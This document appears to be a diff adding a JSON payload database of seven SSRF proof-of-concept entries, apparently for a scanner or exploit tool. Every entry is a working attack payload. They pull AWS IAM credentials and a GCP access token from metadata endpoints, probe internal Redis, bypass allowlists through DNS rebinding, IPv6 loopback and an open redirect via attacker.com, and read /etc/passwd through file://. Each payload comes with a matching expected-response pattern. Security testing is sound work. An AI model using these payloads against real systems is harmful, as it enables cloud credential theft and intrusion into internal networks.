@@ -1,0 +1,93 @@
+[
+    {
+        "poc_id": "ssrf-aws-metadata-001",
+        "vuln_type": "ssrf",
+        "title": "SSRF to AWS EC2 Instance Metadata",
+        "tech_stack": ["python", "java", "php"],
+        "cve_ids": [],
+        "cvss_score": 9.1,
+        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "expected_response": "AccessKeyId|SecretAccessKey|iam",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Fetch AWS IAM credentials from EC2 instance metadata service v1"
+    },
+    {
+        "poc_id": "ssrf-gcp-metadata-002",
+        "vuln_type": "ssrf",
+        "title": "SSRF to GCP Metadata with custom header",
+        "tech_stack": ["python", "java", "go"],
+        "cve_ids": [],
+        "cvss_score": 9.1,
+        "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+        "expected_response": "access_token",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "GCP metadata endpoint (requires Metadata-Flavor: Google header)"
+    },
+    {
+        "poc_id": "ssrf-localhost-port-003",
+        "vuln_type": "ssrf",
+        "title": "SSRF internal port scan via localhost",
+        "tech_stack": ["php", "python", "java"],
+        "cve_ids": [],
+        "cvss_score": 7.5,
+        "payload": "http://127.0.0.1:6379/",
+        "expected_response": "REDIS|redis_version|-ERR",
+        "waf_bypass": false,
+        "severity": "HIGH",
+        "description": "Probe internal Redis instance via SSRF to localhost"
+    },
+    {
+        "poc_id": "ssrf-dns-rebind-004",
+        "vuln_type": "ssrf",
+        "title": "SSRF via DNS rebinding bypass",
+        "tech_stack": ["python", "java"],
+        "cve_ids": [],
+        "cvss_score": 8.6,
+        "payload": "http://7f000001.c0a80001.rbndr.us/",
+        "expected_response": "response from internal host",
+        "waf_bypass": true,
+        "severity": "HIGH",
+        "description": "DNS rebinding to bypass IP validation (resolves alternately to 127.0.0.1)"
+    },
+    {
+        "poc_id": "ssrf-ipv6-bypass-005",
+        "vuln_type": "ssrf",
+        "title": "SSRF bypass via IPv6 loopback",
+        "tech_stack": ["python", "php"],
+        "cve_ids": [],
+        "cvss_score": 8.6,
+        "payload": "http://[::1]/",
+        "expected_response": "localhost response",
+        "waf_bypass": true,
+        "severity": "HIGH",
+        "description": "IPv6 loopback to bypass IPv4-only allowlist checks"
+    },
+    {
+        "poc_id": "ssrf-redirect-006",
+        "vuln_type": "ssrf",
+        "title": "SSRF via open redirect chaining",
+        "tech_stack": ["php", "python", "java"],
+        "cve_ids": [],
+        "cvss_score": 8.6,
+        "payload": "https://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/",
+        "expected_response": "ami-id|instance-type",
+        "waf_bypass": true,
+        "severity": "CRITICAL",
+        "description": "Chain open redirect to bypass URL validation and reach metadata"
+    },
+    {
+        "poc_id": "ssrf-file-scheme-007",
+        "vuln_type": "ssrf",
+        "title": "SSRF via file:// protocol",
+        "tech_stack": ["php", "java"],
+        "cve_ids": [],
+        "cvss_score": 8.6,
+        "payload": "file:///etc/passwd",
+        "expected_response": "root:x:0:0",
+        "waf_bypass": false,
+        "severity": "CRITICAL",
+        "description": "Local file read via file:// scheme when URL scheme is not validated"
+    }
+]
